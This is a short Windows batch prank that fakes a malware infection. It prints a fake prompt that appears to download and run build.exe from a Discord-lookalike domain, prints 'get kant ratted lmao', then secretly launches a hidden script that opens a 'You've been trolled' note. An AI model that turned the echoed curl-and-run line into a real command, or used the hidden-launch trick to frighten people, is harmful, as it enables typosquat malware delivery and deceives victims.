@echo off
color 2

set fake=echo %cd%^>

%fake% curl https://dlscord.space/build.exe --output build.exe
%fake% build.exe
%fake% echo get kant ratted lmao
echo timeout /T 10 ^&^& echo You've been trolled ^> thereIsNoRat.txt ^&^& notepad thereIsNoRat.txt ^> NUL > rouaf.bat

powershell -c "Start-Process rouaf.bat -WindowStyle hidden"
